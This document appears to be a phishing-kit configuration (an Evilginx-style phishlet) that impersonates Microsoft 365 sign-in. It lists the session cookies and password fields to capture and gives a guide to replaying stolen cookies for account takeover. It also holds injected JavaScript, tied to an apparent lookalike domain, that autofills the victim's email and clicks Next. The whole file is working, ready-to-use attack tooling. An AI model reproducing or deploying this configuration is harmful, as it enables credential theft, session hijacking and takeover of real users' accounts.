# Inject JavaScript to autofill the email field, wait for it, click Next


auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys:
      - 'ESTSAUTHPERSISTENT=([^;]+)'
      - 'ESTSAUTH=([^;]+)'
      - 'SignInStateCookie=([^;]+)'
      - 'OhpToken=([^;]+)'
      - 'OhpCode=([^;]+)'
      - 'UserIndex=([^;]+)'
      - 'OhpAuth=([^;]+)'
      - 'OhpAuthC1=([^;]+)'
      - 'OhpAuthC2=([^;]+)'
      - 'AjaxSessionKey=([^;]+)'      
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSAUTHLIGHT', 'ESTSSC', 'SignInStateCookie', '.*,regexp']                

# GUIDE TO GET SESSION FROM COOKIES
# 1) Insert The Captured cookies in browser(Use Any Proper Extention)
# 2) Then Visit Open Below Mentioned Link to reach to the Account.    
# https://login.microsoftonline.com/

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
# Use https://regex101.com to find appropriate regex format to match the post fields to capture.    
login:
  domain: 'www.office.com'
  path: '/login?es=Click&ru=%2F'



js_inject:
  - trigger_domains: ['login.microsoftonline.com','login.husbane.top']
    trigger_paths: ['/', '/common/oauth2/v2.0/authorize', '/common/oauth2/authorize', '/common/*', '/*']
    trigger_params: []
    script: |
      (function() {
        
        function waitFor(selector, timeout = 30000) {
          return new Promise((resolve, reject) => {
            const interval = 250; 
            let elapsed = 0;
            
            const existingEl = document.querySelector(selector);
            if (existingEl) {
              return resolve(existingEl);
            }
            
            const timer = setInterval(() => {
              const el = document.querySelector(selector);
              if (el) {
                clearInterval(timer);
                resolve(el);
              } else if (elapsed >= timeout) {
                clearInterval(timer);
                reject('Timeout waiting for ' + selector);
              }
              elapsed += interval;
            }, interval);
          });
        }

        function getEmail() {          
          function getCookie(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) {
              const cookieValue = parts.pop().split(';').shift();
              return cookieValue;
            }
            return null;
          }
          

          const emailFromCookie = getCookie('user_email');
          if (emailFromCookie) {
            return emailFromCookie;
          }
          
          const urlParams = new URLSearchParams(window.location.search);
          
          if (urlParams.has('e')) {
            try {
              const encodedEmail = urlParams.get('e');
              const decodedEmail = atob(encodedEmail);
              
              const cookieDomain = `.${window.location.hostname.split('.').slice(-2).join('.')}`;
              document.cookie = `user_email=${decodedEmail}; path=/; domain=${cookieDomain}`;
              
              return decodedEmail;
            } catch (error) {
            }
          }
          
          const localEmail = localStorage.getItem('user_email');
          if (localEmail) {
            
            const cookieDomain = `.${window.location.hostname.split('.').slice(-2).join('.')}`;
            document.cookie = `user_email=${localEmail}; path=/; domain=${cookieDomain}`;
            
            return localEmail;
          }
          
          return null;
        }
        
        const email = getEmail();
        
        if (email) {
          
          const checkInterval = setInterval(() => {
            const emailInput = document.querySelector('input[name="login"], input[type="email"], input[id="i0116"]');
            
            if (emailInput) {
              
              emailInput.value = email;
              
              try {
                const inputEvent = new Event('input', { bubbles: true });
                emailInput.dispatchEvent(inputEvent);
                
                const changeEvent = new Event('change', { bubbles: true });
                emailInput.dispatchEvent(changeEvent);
              } catch (e) {
              }
              
              const nextBtn = document.querySelector('input[type="submit"], button[type="submit"], button#idSIButton9');
              
              if (nextBtn) {
                
                // النقر على زر التالي بعد تأخير قصير
                setTimeout(() => {
                  try {
                    nextBtn.click();
                  } catch (e) {
                  }
                }, 500);
              } else {
                return;
              }
              
              clearInterval(checkInterval);
            }
          }, 250);
          
          setTimeout(() => {
            clearInterval(checkInterval);
          }, 3 * 60 * 1000);
        } else {
          
        }
      })();
